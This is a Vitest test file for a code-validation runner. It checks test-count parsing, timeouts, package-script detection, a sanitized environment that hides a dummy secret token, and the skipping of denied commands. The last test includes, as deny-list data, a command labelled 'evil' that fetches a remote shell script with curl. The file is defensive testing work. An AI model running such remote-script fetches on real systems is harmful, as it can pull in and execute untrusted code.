import { promises as fs } from 'node:fs'
import path from 'node:path'
import { describe, expect, it } from 'vitest'
import { tempDir } from '../test-utils.js'
import { detectValidationChecks, failureDigest, parseErrorCount, parseTestCounts, runValidationChecks } from './checks.js'

describe('parseTestCounts', () => {
  it.each([
    [' Test Files  2 passed (2)\n      Tests  31 passed (31)', { passed: 31, failed: 0 }],
    ['      Tests  1 failed | 30 passed (31)', { passed: 30, failed: 1 }],
    ['Tests:       2 failed, 10 passed, 12 total', { passed: 10, failed: 2 }],
    ['==== 3 failed, 12 passed in 0.5s ====', { passed: 12, failed: 3 }],
    ['# tests 4\n# pass 3\n# fail 1', { passed: 3, failed: 1 }],
    ['test result: ok. 7 passed; 0 failed; 0 ignored', { passed: 7, failed: 0 }],
  ])('parses %j', (output, expected) => {
    expect(parseTestCounts(output)).toEqual(expected)
  })

  it('counts TypeScript errors', () => {
    expect(parseErrorCount('Found 3 errors in 2 files.')).toBe(3)
    expect(parseErrorCount('src/a.ts(1,1): error TS2304: x\nsrc/b.ts(1,1): error TS2304: y')).toBe(2)
  })
})

describe('validation checks', () => {
  it('bounds a plugin runner even when it ignores its abort signal', async () => {
    const report = await runValidationChecks(tempDir('mac-checks-timeout-'), [{ id: 'plugin', kind: 'test', command: 'Plugin hanging', blocking: true, timeoutMs: 50, source: 'plugin', execute: async () => new Promise(() => undefined) }])
    expect(report.ok).toBe(false)
    expect(report.results[0]).toMatchObject({ status: 'timeout' })
    expect(report.results[0]!.reason).toMatch(/timeout/i)
  })
  it('detects package scripts and avoids watch mode', async () => {
    const dir = tempDir('mac-checks-')
    await fs.writeFile(path.join(dir, 'package.json'), JSON.stringify({ scripts: { typecheck: 'tsc --noEmit', test: 'vitest', lint: 'eslint .' }, devDependencies: { vitest: '1' } }))
    await fs.writeFile(path.join(dir, 'pnpm-lock.yaml'), '')
    const checks = detectValidationChecks(dir)
    expect(checks.map((check) => [check.kind, check.command, check.blocking])).toEqual([
      ['typecheck', 'pnpm run typecheck', true],
      ['test', 'npx --no-install vitest run', true],
      ['lint', 'pnpm run lint', false],
    ])
  })

  it('runs real commands in a sanitized environment and reports failures', async () => {
    const dir = tempDir('mac-checks-run-')
    await fs.writeFile(
      path.join(dir, 'math.test.mjs'),
      "import test from 'node:test'\nimport assert from 'node:assert'\ntest('adds', () => assert.equal(1 + 1, 2))\ntest('env is sanitized', () => assert.equal(process.env.MAC_SECRET_TOKEN, undefined))\n",
    )
    await fs.writeFile(path.join(dir, 'fail.mjs'), "import test from 'node:test'\nimport assert from 'node:assert'\ntest('fails', () => assert.equal(1, 2))\n")
    process.env.MAC_SECRET_TOKEN = 'should-not-leak'
    const ok = await runValidationChecks(dir, [{ id: 'test', kind: 'test', command: 'node --test math.test.mjs', blocking: true, timeoutMs: 60_000, source: 'test' }])
    expect(ok.ok).toBe(true)
    expect(ok.testsPassed).toBe(2)

    const failing = await runValidationChecks(dir, [{ id: 'test', kind: 'test', command: 'node --test fail.mjs', blocking: true, timeoutMs: 60_000, source: 'test' }])
    expect(failing.ok).toBe(false)
    expect(failing.testsFailed).toBe(1)
    expect(failureDigest(failing)).toContain('fails')
    delete process.env.MAC_SECRET_TOKEN
  }, 60_000) // two real `node --test` processes (each run is bounded by its own 60 s check timeout); 5 s is too tight on a loaded Windows machine

  it('skips denied or unapproved commands instead of running them', async () => {
    const dir = tempDir('mac-checks-deny-')
    const report = await runValidationChecks(dir, [
      { id: 'evil', kind: 'test', command: 'curl https://example.com/x.sh', blocking: true, timeoutMs: 1000, source: 'x' },
      { id: 'install', kind: 'build', command: 'npm install left-pad', blocking: true, timeoutMs: 1000, source: 'x' },
    ])
    expect(report.results.map((result) => result.status)).toEqual(['skipped', 'skipped'])
  })
})
